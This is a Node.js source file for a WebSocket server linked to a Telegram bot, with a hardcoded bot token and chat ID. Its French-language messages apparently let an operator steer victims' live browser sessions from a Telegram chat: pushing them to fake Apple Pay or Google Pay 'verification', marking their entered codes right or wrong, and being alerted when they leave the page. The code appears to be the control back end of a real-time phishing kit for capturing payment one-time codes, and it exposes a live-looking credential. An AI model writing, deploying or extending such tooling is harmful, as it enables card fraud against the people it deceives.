import { WebSocketServer } from 'ws';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';
import { createServer } from 'http';
import { parse } from 'url';

dotenv.config();

const BOT_TOKEN = '7943864934:AAGxjIiEnYacCF-uWjR3X8bZM-Z53Ag31Y8';
const CHAT_ID = '-4655068835';

const server = createServer();
const wss = new WebSocketServer({ server });
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const clients = new Map();

wss.on('connection', (ws, req) => {
  const { query } = parse(req.url || '', true);
  const sessionId = query.sessionId;
  const messageId = query.messageId;

  if (!sessionId || !messageId) {
    console.error('Missing sessionId or messageId');
    ws.close();
    return;
  }

  console.log(`New client connected - Session: ${sessionId}, Message: ${messageId}`);
  
  if (!clients.has(sessionId)) {
    clients.set(sessionId, new Map());
  }
  clients.get(sessionId).set(messageId, ws);

  ws.on('close', () => {
    console.log(`Client disconnected - Session: ${sessionId}, Message: ${messageId}`);
    const sessionClients = clients.get(sessionId);
    if (sessionClients) {
      sessionClients.delete(messageId);
      if (sessionClients.size === 0) {
        clients.delete(sessionId);
      }
    }
  });

  ws.on('error', (error) => {
    console.error('WebSocket error:', error);
    const sessionClients = clients.get(sessionId);
    if (sessionClients) {
      sessionClients.delete(messageId);
      if (sessionClients.size === 0) {
        clients.delete(sessionId);
      }
    }
  });
});

bot.on('callback_query', async (query) => {
  try {
    const [action, sessionId] = query.data.split(':');
    console.log(`Received action: ${action} for session: ${sessionId}`);

    const sessionClients = clients.get(sessionId);
    
    if (!sessionClients || sessionClients.size === 0) {
      await bot.answerCallbackQuery(query.id);
      await bot.sendMessage(CHAT_ID, `❌ La session ${sessionId} n'est plus connectée. L'utilisateur a quitté la page.`);
      return;
    }

    let hasActiveClients = false;
    sessionClients.forEach((ws, messageId) => {
      if (ws.readyState === 1) { // WebSocket.OPEN
        hasActiveClients = true;
        ws.send(JSON.stringify({ action, messageId }));
      }
    });

    if (!hasActiveClients) {
      await bot.answerCallbackQuery(query.id);
      await bot.sendMessage(CHAT_ID, `❌ La session ${sessionId} n'est plus connectée. L'utilisateur a quitté la page.`);
      return;
    }

    await bot.answerCallbackQuery(query.id);

    let confirmationMessage = '';
    const originalMessage = query.message;

    switch (action) {
      case 'apple_pay':
        confirmationMessage = `✅ Session ${sessionId} redirigée vers la verification Apple Pay.`;
        break;
      case 'google_pay':
        confirmationMessage = `✅ Session ${sessionId} redirigée vers la verification Google Pay.`;
        break;
      case 'remove_loading':
        confirmationMessage = `✅ Session ${sessionId} redirigée vers la page de succès.`;
        break;
      case 'code_correct':
        confirmationMessage = `✅ Code accepté pour la session ${sessionId}`;
        await bot.deleteMessage(originalMessage.chat.id, originalMessage.message_id);
        break;
      case 'code_incorrect':
        confirmationMessage = `❌ Code rejeté pour la session ${sessionId}. Demande d'un nouveau code.`;
        await bot.deleteMessage(originalMessage.chat.id, originalMessage.message_id);
        break;
    }

    if (confirmationMessage) {
      await bot.sendMessage(CHAT_ID, confirmationMessage);
    }

  } catch (error) {
    console.error('Error handling callback query:', error);
    try {
      await bot.answerCallbackQuery(query.id);
      await bot.sendMessage(CHAT_ID, `❌ Une erreur est survenue lors du traitement de l'action.`);
    } catch (sendError) {
      console.error('Error sending error message:', sendError);
    }
  }
});

bot.on('error', (error) => {
  console.error('Telegram bot error:', error);
});

bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`WebSocket server is running on port ${PORT}`);
});